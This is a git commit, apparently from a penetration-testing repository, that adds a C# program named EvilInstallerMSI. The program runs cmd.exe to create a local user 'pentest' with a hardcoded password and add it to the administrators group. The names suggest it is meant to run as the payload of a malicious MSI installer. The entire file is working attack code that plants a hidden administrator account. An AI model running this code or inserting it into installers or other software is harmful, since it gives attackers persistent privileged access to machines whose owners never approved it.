ff90f244583cec19b5e01064bb24ae5aef8ade6d
LuemmelSec <58529760+LuemmelSec@users.noreply.github.com>
2023-08-22 12:03:59 +0200

    Add files via upload

---
+++ EvilInstallerMSI/Program.cs
@@ -0,0 +1,25 @@
+﻿using System.Diagnostics;
+
+namespace EvilMSI
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var si = new ProcessStartInfo
+            {
+                FileName = @"cmd.exe",
+                Arguments = @"/c net user pentest Qwert12345!! /add && net localgroup administrators pentest /add"
+            };
+
+            var proc = new Process
+            {
+                StartInfo = si
+            };
+
+            proc.Start();
+            proc.WaitForExit();
+            proc.Dispose();
+        }
+    }
+}
